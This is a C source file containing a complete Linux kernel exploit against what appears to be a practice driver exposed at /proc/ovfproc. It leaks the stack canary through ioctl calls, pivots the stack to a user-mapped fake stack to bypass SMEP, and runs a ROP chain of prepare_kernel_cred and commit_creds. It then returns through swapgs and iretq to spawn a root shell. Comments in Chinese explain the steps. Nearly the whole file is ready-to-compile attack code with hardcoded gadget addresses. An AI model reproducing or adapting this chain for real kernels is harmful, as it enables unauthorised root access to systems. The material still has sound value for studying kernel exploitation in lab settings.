//gcc -Os -static -masm=intel exploit.c -lutil -o exploit
//home/overflow/ret2usr/bypass_smep/pivot/exploit
#include "mykernelpwn.h"

#define pop_rdi_ret 0xffffffff8107fc70
#define swapgs_pop_rbp_ret 0xffffffff81069864
#define iretq_pop_rbp_ret 0xffffffff81036a9b

#define mov_rdi_rax_pop_rbp_ret 0xffffffff814d753b
#define mov_esp_pop_r12_pop_rbp_ret 0xffffffff8156cbaa

#define init_cred 0xffffffff8265a980
#define commit_creds 0xffffffff810b7fb0
#define prepare_kernel_cred 0xffffffff810b8360

void ovf_read(int fd, char* buf)
{
    ioctl(fd, 0x112233, buf);
}

void set_offset(int fd, long offset)
{
    ioctl(fd, 0x334455, offset);
}

void ovf_copy_func(int fd, long len)
{
    ioctl(fd, 0x223344, len);
}

int main(int argc, char** argv)
{
    bind_core(0);
    save_status();

    int fd = open("/proc/ovfproc", 2);
    if(fd <0)
    {
        printf("\033[31m\033[1m[-] Failed to open the file: /proc/ovfproc!\033[0m\n");
        exit(-1);
    }

    // get the canary
    size_t canary;
    char buf[0x50];

    set_offset(fd, 64);
    ovf_read(fd, buf);
    
    canary = ((size_t *)buf)[0];
    printf("\033[32m\033[1m[+] Successful to get the value of canary: 0x%lx\033[0m\n", canary);

    //construct the ropchain
    size_t rop_chain[0x100], buf_rop[0x100], i;
    // 映射匿名页
    size_t* fake_stack = mmap((void *) 0x5b000000 - 0x1000, 0x2000, 
        PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    // 初始化匿名页，建立页表，防止缺页异常
    fake_stack[0]   = 0xdeadbeef;

    i = 0x1000 / 8;
    fake_stack[i++] = 0;    // r12
    fake_stack[i++] = 0;    // rbp
    fake_stack[i++] = pop_rdi_ret;
    fake_stack[i++] = 0;
    fake_stack[i++] = prepare_kernel_cred;
    fake_stack[i++] = mov_rdi_rax_pop_rbp_ret;
    fake_stack[i++] = 0;    // rbp
    fake_stack[i++] = commit_creds;
    fake_stack[i++] = swapgs_pop_rbp_ret;
    fake_stack[i++] = 0;    // rbp
    fake_stack[i++] = iretq_pop_rbp_ret;
    fake_stack[i++] = (size_t)get_root_shell;
    fake_stack[i++] = user_cs;
    fake_stack[i++] = user_rflags;
    fake_stack[i++] = user_sp + 8;
    fake_stack[i++] = user_ss;

    for(i = 0; i < 10; i++)
        rop_chain[i] = canary;
    // 0xffffffff8156cbaa : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
    // 栈迁移到 0x5b000000
    rop_chain[i++] = mov_esp_pop_r12_pop_rbp_ret;

    write(fd, rop_chain, 0x100);
    read(fd, buf_rop, 0x100);
    print_binary(buf_rop, 0x100);
    
    ovf_copy_func(fd, 0xffffffffffff0000 | (0x100)); //转换无符号16位为0x100
    close(fd);
}
